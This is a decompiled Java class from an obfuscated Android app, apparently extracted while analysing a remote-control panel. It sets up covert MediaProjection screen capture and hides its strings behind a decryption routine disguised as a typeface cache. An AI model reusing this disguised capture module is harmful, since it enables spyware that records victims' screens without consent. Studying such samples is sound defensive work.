package v.s;

import android.hardware.display.VirtualDisplay;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import app.mobilex.plus.services.ManagerUMController;
import app.mobilex.plus.util.TypefaceCache;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final /* synthetic */ class l3twm5tDUAP2 implements Runnable {
    public final /* synthetic */ ManagerUMController vekpFI4d1Nc4fakF;
    public final /* synthetic */ int w9sT1Swbhx3hs;

    public /* synthetic */ l3twm5tDUAP2(ManagerUMController managerUMController, int i) {
        this.w9sT1Swbhx3hs = i;
        this.vekpFI4d1Nc4fakF = managerUMController;
    }

    @Override // java.lang.Runnable
    public final void run() {
        VirtualDisplay virtualDisplayCreateVirtualDisplay;
        int i = 2;
        switch (this.w9sT1Swbhx3hs) {
            case 0:
                ManagerUMController managerUMController = this.vekpFI4d1Nc4fakF;
                synchronized (managerUMController.wotphlvK9sPbXJ) {
                    managerUMController.Qrz92kRPw4GcghAc = false;
                }
                return;
            case 1:
                ManagerUMController managerUMController2 = this.vekpFI4d1Nc4fakF;
                synchronized (managerUMController2.gIIiyi2ddlMDR0) {
                    try {
                        try {
                            VirtualDisplay virtualDisplay = managerUMController2.w9sT1Swbhx3hs;
                            if (virtualDisplay != null) {
                                virtualDisplay.release();
                            }
                            managerUMController2.w9sT1Swbhx3hs = null;
                            ImageReader imageReader = managerUMController2.vekpFI4d1Nc4fakF;
                            if (imageReader != null) {
                                imageReader.setOnImageAvailableListener(null, null);
                            }
                            try {
                                ImageReader imageReader2 = managerUMController2.vekpFI4d1Nc4fakF;
                                if (imageReader2 != null) {
                                    imageReader2.close();
                                }
                                break;
                            } catch (Exception unused) {
                            }
                            managerUMController2.vekpFI4d1Nc4fakF = null;
                            managerUMController2.pyu8ovAipBTLYAiKab();
                            int i2 = QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM;
                            int iJ0zjQ7CAgohuxU20eCW6 = Y9mRyRdkl5FOcwb66V6.J0zjQ7CAgohuxU20eCW6(QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM);
                            if (iJ0zjQ7CAgohuxU20eCW6 == 0) {
                                i = 3;
                            } else if (iJ0zjQ7CAgohuxU20eCW6 != 1) {
                                if (iJ0zjQ7CAgohuxU20eCW6 != 2) {
                                    throw new Sb7Xj3N9U1DQ();
                                }
                                i = 1;
                            }
                            managerUMController2.vekpFI4d1Nc4fakF = ImageReader.newInstance(managerUMController2.b1EoSIRjJHO5, managerUMController2.pyu8ovAipBTLYAiKab, 1, i);
                            managerUMController2.vekpFI4d1Nc4fakF();
                            MediaProjection mediaProjection = managerUMController2.dDIMxZXP1V8HdM;
                            if (mediaProjection != null) {
                                String strObtain = TypefaceCache.obtain("003000750049008200F500B100D100A60033");
                                int i3 = managerUMController2.b1EoSIRjJHO5;
                                int i4 = managerUMController2.pyu8ovAipBTLYAiKab;
                                int i5 = managerUMController2.D5P1xCAyuvgF;
                                ImageReader imageReader3 = managerUMController2.vekpFI4d1Nc4fakF;
                                virtualDisplayCreateVirtualDisplay = mediaProjection.createVirtualDisplay(strObtain, i3, i4, i5, 18, imageReader3 != null ? imageReader3.getSurface() : null, null, null);
                            } else {
                                virtualDisplayCreateVirtualDisplay = null;
                            }
                            managerUMController2.w9sT1Swbhx3hs = virtualDisplayCreateVirtualDisplay;
                            if (virtualDisplayCreateVirtualDisplay != null) {
                                ImageReader imageReader4 = managerUMController2.vekpFI4d1Nc4fakF;
                                if (imageReader4 != null) {
                                    imageReader4.setOnImageAvailableListener(new pkLNH6NnynzgsXMXhe(managerUMController2), managerUMController2.gmNWMfvn6zlEj);
                                }
                                ManagerUMController.ECwLkmPW1UKz7J6E = true;
                                TypefaceCache.obtain("0015007F0049009300E500BE00DE0083002A0065004B008B00F100A6009200A400310073005A009300F500BB008800E7");
                                TypefaceCache.obtain("0063003E004F008600E200B800D700B30063");
                            } else {
                                TypefaceCache.obtain("00200064005E008600E400BA00E400AE00310062004E008600FC009B00DB00B40033007A005A009E00B000AD00D700B3003600640055008200F400FF00DC00B2002F007A001B20F300B000AF00C000A8002900730058009300F900B000DC00E7002F007F0050008200FC00A6009200A300260077005F");
                                ManagerUMController.ECwLkmPW1UKz7J6E = false;
                                managerUMController2.dDIMxZXP1V8HdM = null;
                            }
                        } catch (Throwable th) {
                            throw th;
                        }
                    } catch (Exception e) {
                        TypefaceCache.obtain("00200064005E008600E400BA00E400AE00310062004E008600FC009B00DB00B40033007A005A009E00B000BA00C000B5002C0064000100C7");
                        e.getMessage();
                        ManagerUMController.ECwLkmPW1UKz7J6E = false;
                        managerUMController2.dDIMxZXP1V8HdM = null;
                    }
                }
                return;
            case 2:
                ManagerUMController managerUMController3 = this.vekpFI4d1Nc4fakF;
                while (managerUMController3.J0zjQ7CAgohuxU20eCW6) {
                    try {
                        String str = managerUMController3.getResources().getConfiguration().orientation == 2 ? "L" : "P";
                        if (!str.equals(managerUMController3.MLSIo1htfMPWeB8V876L)) {
                            TypefaceCache.obtain("000C00640052008200FE00AB00D300B3002A0079005500C700F300B700D300A900240073005F00DD00B0");
                            TypefaceCache.obtain("0063003B000500C7");
                            managerUMController3.MLSIo1htfMPWeB8V876L = str;
                            managerUMController3.JXn4Qf7zpnLjP5();
                        }
                        Thread.sleep(2000L);
                    } catch (InterruptedException unused2) {
                        return;
                    } catch (Exception e2) {
                        TypefaceCache.obtain("000C00640052008200FE00AB00D300B3002A0079005500B000F100AB00D100AF00260064000100C7");
                        e2.getMessage();
                    }
                }
                return;
            default:
                this.vekpFI4d1Nc4fakF.JXn4Qf7zpnLjP5();
                return;
        }
    }
}
